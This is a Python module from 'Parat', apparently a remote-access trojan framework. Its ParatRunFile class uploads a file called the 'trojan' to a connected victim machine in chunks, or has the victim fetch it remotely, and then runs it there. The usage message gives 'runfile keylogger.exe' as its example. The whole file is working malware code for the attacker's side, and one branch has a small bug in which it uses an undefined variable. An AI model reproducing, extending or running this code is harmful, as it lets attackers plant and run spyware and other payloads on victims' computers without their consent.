#
# Copyright(c) 2017, micle(@micle_fm - www.micle.ir - mhd.ceh8@gmail)
# Parat project is under the GNU GENERAL PUBLIC LICENSE (GPL) license.
# see the COPYING file for the detailed licence terms
#

import os
from time import sleep
from lib.ParatPrint import colorize, pprint, gray
from lib.ParatEncrypt import Encode, Decode
from lib.ProcessThread import ParatProcessBar


class ParatRunFile:

    def __init__(self, conn, args, colors):

        self.conn         = conn
        self.args         = args
        self.colors       = colors
        self.trojan_name  = None


    def local_method(self):

        try:

            self.conn.send(Encode("runfile<#>" + self.trojan_name + "<#>LOCAL_GET"))
            trojan_file = open(self.trojan_name, "rb")
            chunk = trojan_file.read(4096)

            pprint(
                colorize(
                    "Local method detcted!\n",
                    colored=self.colors,
                    status="INF"
                ))
            self.process_bar.start_process()

            self.conn.send(Encode("#IS_FILE"))
            sleep(0.1)

            while chunk:
                self.conn.send(chunk); sleep(0.1)
                chunk = trojan_file.read(4096)

            self.conn.send("#UPLOAD_END")
            trojan_file.close()
            status = Decode(self.conn.recv(4096))

            if status == "#OPENED":
                pprint(colorize("Running successfull.", colored=self.colors, status="SUC"))
            elif status == "#NOT_OPENED":
                pprint(colorize("Runtime error.\n", colored=self.colors, status="ERR"))
            else:
                pprint(status) if self.colors else pprint(gray(status))

            self.process_bar.Stop = True; sleep(0.2)


        except IOError:

            self.conn.send(Encode("#NOT_FILE"))
            if self.process_bar:
                self.process_bar.Stop = True; sleep(0.2)
            pprint(
                colorize(
                    "No file specified.\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)



    def remote_method(self):

        try:

            pprint(
                colorize(
                    "Remote method detcted!\n",
                    colored=self.colors,
                    status="INF"
                ))
            self.process_bar.start_process()

            self.conn.send(Encode("runfile<#>" + self.trojan_name + "<#>REMOTE_GET"))
            exec_status = Decode(self.conn.recv(4096))

            if exec_status == "#OPENED":
                pprint(colorize("Running successfull.", colored=self.colors, status="SUC"))
            elif status == "#NOT_OPENED":
                pprint(colorize("Runtime error.\n", colored=self.colors, status="ERR"))
            else:
                pprint(status) if self.colors else pprint(gray(status))

            self.process_bar.Stop = True; sleep(0.2)


        except:

            if self.process_bar:
                self.process_bar.Stop = True; sleep(0.2)

            pprint(
                colorize(
                    "Running failed.\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)



    def start(self):

        try:

            if len(self.args) == 0:
                pprint(
                    colorize(
                        "usage: runfile keylogger.exe\n",
                        colored=self.colors,
                        status="INF"
                    ))

            else:

                self.trojan_name = self.args[0]
                text = colorize(
                    "uploading",
                    colored=self.colors,
                    status="INF"
                )
                self.process_bar = ParatProcessBar(text)

                if os.path.isfile(self.trojan_name):
                    self.local_method()
                else:
                    self.remote_method()

        except Exception as e:

            if self.process_bar:
                self.process_bar.Stop = True; sleep(0.2)

            pprint(
                colorize(
                    "Running failed.\n",
                    colored=self.colors,
                    status="ERR"
                ), 1)
